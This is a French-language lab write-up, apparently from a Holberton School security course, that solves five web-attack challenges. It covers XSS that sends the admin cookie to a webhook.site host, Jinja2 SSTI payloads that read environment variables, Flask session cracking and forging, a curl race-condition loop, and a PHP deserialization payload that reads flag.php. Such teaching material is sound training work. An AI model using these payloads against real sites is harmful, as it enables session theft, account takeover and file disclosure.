# Techniques Avancées d'Attaque Web

## Description
Ce projet se concentre sur les vulnérabilités avancées de sécurité des applications web, notamment le Cross-Site Scripting (XSS), la désérialisation non sécurisée et l'injection de templates côté serveur (SSTI).

## Objectifs d'apprentissage
- Comprendre l'impact et les risques des vulnérabilités dans les applications web
- Identifier et expliquer les types de XSS
- Expliquer comment les injections XSS fonctionnent et exploitent les applications web
- Implémenter des techniques de prévention
- Reconnaître l'importance des pratiques de codage sécurisé
- Intégrer des contrôles de sécurité dans le cycle de développement

## Tâches

### Tâche 0 : Challenge XSS Avancé - Exploitation de la Galerie Photo
**Objectif :** Exploiter une vulnérabilité XSS pour capturer le cookie de l'administrateur.

**Vulnérabilité :** L'application utilise `eval()` sur une entrée contrôlée par l'utilisateur sans validation :
```javascript
const holberton = new URL(location).searchParams.get("holberton") || '';
eval(holberton);
```

**Étapes d'exploitation :**
1. Créer un webhook sur webhook.site pour recevoir le cookie volé
2. Créer un payload pour rediriger avec les cookies :
   ```javascript
   document.location='https://webhook.site/VOTRE-ID?c='+document.cookie
   ```
3. Encoder le payload en URL et l'injecter via le paramètre `holberton`
4. Soumettre l'URL malveillante via la page Suggestion (`/report`)
5. Surveiller le webhook pour obtenir le cookie de l'admin contenant le flag

**Format de l'URL malveillante :**
```
http://web0x0a.task0.hbtn/?holberton=document.location%3D%27https%3A%2F%2Fwebhook.site%2FVOTRE-ID%3Fc%3D%27%2Bdocument.cookie
```

### Tâche 1 : Holberton Notes App - Exploitation SSTI
**Objectif :** Exploiter une vulnérabilité Server-Side Template Injection (SSTI) pour récupérer le flag.

**Vulnérabilité :** L'application Flask utilise `render_template_string()` sur une entrée utilisateur avec une blacklist insuffisante :
```python
BLACKLIST = ["{%", "%}", "import", "open", "sys"]

def sanitize_input(content):
    for item in BLACKLIST:
        if item in content:
            raise ValueError("Blacklisted characters detected")
    return content

# L'entrée est directement rendue sans échappement
return render_template_string(sanitized_content)
```

**Analyse de la blacklist :**
- Bloqué : `{%`, `%}`, `import`, `open`, `sys`
- Autorisé : `{{`, `}}`, `__class__`, `__globals__`, `os`, `environ`

**Payloads fonctionnels :**
```jinja2
{{url_for.__globals__['os'].environ}}
```
ou
```jinja2
{{lipsum.__globals__['os'].environ}}
```

**Étapes d'exploitation :**
1. Accéder à `http://web0x0a.task1.hbtn`
2. Tester la vulnérabilité avec `{{7*7}}` (doit afficher `49`)
3. Injecter le payload pour accéder aux variables d'environnement
4. Le flag se trouve dans les variables d'environnement

### Tâche 2 : Vulnérabilité XSS - Vol de credentials admin
**Objectif :** Exploiter une vulnérabilité XSS pour voler les credentials de l'administrateur et accéder au panel admin.

**Vulnérabilité :** La page `/report` permet de soumettre une URL que l'admin va visiter. L'admin visite l'URL avec ses cookies d'authentification.

**Étapes d'exploitation :**
1. Créer un webhook sur webhook.site
2. Soumettre l'URL du webhook via la page `/report` :
   ```
   https://webhook.site/VOTRE-ID
   ```
3. L'admin visite l'URL et son cookie est capturé dans les headers de la requête
4. Récupérer le cookie depuis le webhook :
   ```
   token=super_admin+reUdDiYS5A
   ```
5. Se connecter sur `/login` avec les credentials extraits du cookie :
   - Username : `super_admin`
   - Password : `reUdDiYS5A`
6. Naviguer dans le panel admin pour récupérer le flag

### Tâche 3 : Bypass Registration et Race Condition
**Objectif :** Bypasser l'inscription désactivée, manipuler la session Flask, et exploiter une race condition pour acheter un cours.

**Vulnérabilités exploitées :**
1. **Bypass d'inscription** : Champ caché `registration=disabled` modifiable
2. **Session Flask non sécurisée** : Clé secrète faible (`cookie1`)
3. **Race condition** : Le coupon peut être utilisé plusieurs fois via requêtes simultanées

**Étapes d'exploitation :**

1. **Bypass de l'inscription** - Dans Burp, modifier la requête POST `/register` :
   ```
   username=hacker&email=hacker@test.com&password=hacker123&registration=enabled
   ```

2. **Récupérer et décoder le cookie de session** :
   ```bash
   flask-unsign --decode --cookie "VOTRE_COOKIE"
   # Résultat : {'user_id': 'hacker'}
   ```

3. **Trouver la clé secrète** :
   ```bash
   flask-unsign --unsign --cookie "VOTRE_COOKIE" --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval
   # Clé trouvée : cookie1
   ```

4. **Forger un cookie avec permission d'achat** :
   ```bash
   flask-unsign --sign --cookie "{'user_id': 'hacker', 'can_buy': True}" --secret "cookie1"
   ```

5. **Utiliser le nouveau cookie** dans le navigateur (DevTools → Console) :
   ```javascript
   document.cookie = "session=NOUVEAU_COOKIE"
   ```

6. **Race condition sur le coupon** - Envoyer plusieurs requêtes simultanées :
   ```bash
   for i in {1..20}; do
     curl -X POST "http://web0x0a.task3.hbtn/redeem_coupon" \
       -H "Cookie: session=VOTRE_COOKIE" &
   done
   wait
   ```

7. **Acheter un cours** avec les crédits accumulés pour obtenir le flag

### Tâche 4 : PHP Deserialization - Upload Exploit
**Objectif :** Exploiter une vulnérabilité de désérialisation PHP pour lire le fichier flag.

**Vulnérabilité :** L'application désérialise les données uploadées sans validation, permettant de lire des fichiers arbitraires via l'attribut `cover_path`.

**Étapes d'exploitation :**

1. **Fuzzing pour trouver l'endpoint d'upload** :
   ```bash
   gobuster dir -u http://web0x0a.task4.hbtn/ -w /usr/share/wordlists/dirb/common.txt -x php
   ```
   Endpoints trouvés : `/upload.php`, `/flag.php`, `/book.php`

2. **Créer le payload PHP sérialisé** (fichier `exploit.txt`) :
   ```php
   O:4:"Book":4:{s:5:"title";s:14:"Exploited Book";s:6:"author";s:8:"Attacker";s:10:"cover_path";s:22:"/var/www/html/flag.php";s:11:"cover_image";N;}
   ```

3. **Bypass de la vérification admin** - Changer la méthode HTTP de POST à PUT

4. **Envoyer la requête avec Burp Suite** :
   ```
   PUT /upload.php HTTP/1.1
   Host: web0x0a.task4.hbtn
   Content-Type: application/x-www-form-urlencoded
   Cookie: PHPSESSID=VOTRE_SESSION

   fileToUpload=O:4:"Book":4:{s:5:"title";s:14:"Exploited Book";s:6:"author";s:8:"Attacker";s:10:"cover_path";s:22:"/var/www/html/flag.php";s:11:"cover_image";N;}
   ```

5. **Récupérer le flag** dans la réponse - la désérialisation lit le contenu du fichier `flag.php` et l'affiche dans `cover_image`

## Prérequis
- Éditeurs autorisés : vi, vim, emacs
- Tous les scripts testés sur Kali Linux
- Tous les fichiers se terminent par une nouvelle ligne

## Auteur
Projet Cybersécurité Holberton School
